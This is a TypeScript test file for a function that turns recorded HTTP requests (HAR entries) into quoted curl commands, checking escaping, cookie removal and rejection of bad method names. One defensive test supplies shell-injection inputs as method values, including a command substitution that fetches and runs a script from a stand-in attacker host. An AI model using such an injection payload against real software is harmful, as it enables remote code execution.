import assert from "node:assert/strict";
import test from "node:test";
import { buildCurl, type HarEntry } from "../../src/lib/har.ts";

function makeEntry(request: Partial<HarEntry["request"]> = {}): HarEntry {
  return {
    request: { method: "GET", url: "https://example.test/", ...request },
    response: { status: 200 },
  };
}

test("quotes the URL so shell operators cannot break out", () => {
  assert.equal(
    buildCurl(makeEntry({ url: "https://example.test/?a=1&b=2" })),
    "curl --url 'https://example.test/?a=1&b=2'",
  );
});

test("quotes the method and every argument", () => {
  assert.equal(
    buildCurl(
      makeEntry({
        method: "POST",
        url: "https://example.test/api",
        headers: [{ name: "Content-Type", value: "application/json" }],
        postData: { text: '{"a":"x y"}' },
      }),
    ),
    `curl -X 'POST' --url 'https://example.test/api' -H 'Content-Type: application/json' -d '{"a":"x y"}'`,
  );
});

test("single-quoted arguments keep quotes, backticks, and dollars literal", () => {
  assert.equal(
    buildCurl(makeEntry({ headers: [{ name: "X-Test", value: 'a"b`c$d' }] })),
    `curl --url 'https://example.test/' -H 'X-Test: a"b\`c$d'`,
  );
});

test("escapes embedded single quotes", () => {
  assert.equal(
    buildCurl(makeEntry({ headers: [{ name: "X-Test", value: "it's" }] })),
    `curl --url 'https://example.test/' -H 'X-Test: it'\\''s'`,
  );
});

test("rejects invalid HTTP method tokens instead of emitting shell syntax", () => {
  assert.equal(
    buildCurl(makeEntry({ method: "GET;id" })),
    "# Unsupported HTTP method — cURL command not generated",
  );
  assert.equal(
    buildCurl(makeEntry({ method: "$(curl //attacker.test/x|sh)" })),
    "# Unsupported HTTP method — cURL command not generated",
  );
});

test("keeps skipping cookie headers and encodes form params", () => {
  assert.equal(
    buildCurl(
      makeEntry({
        method: "POST",
        headers: [
          { name: "Cookie", value: "sid=secret" },
          { name: "Accept", value: "*/*" },
        ],
        postData: { params: [{ name: "a b", value: "c&d" }] },
      }),
    ),
    `curl -X 'POST' --url 'https://example.test/' -H 'Accept: */*' -d 'a%20b=c%26d'`,
  );
});
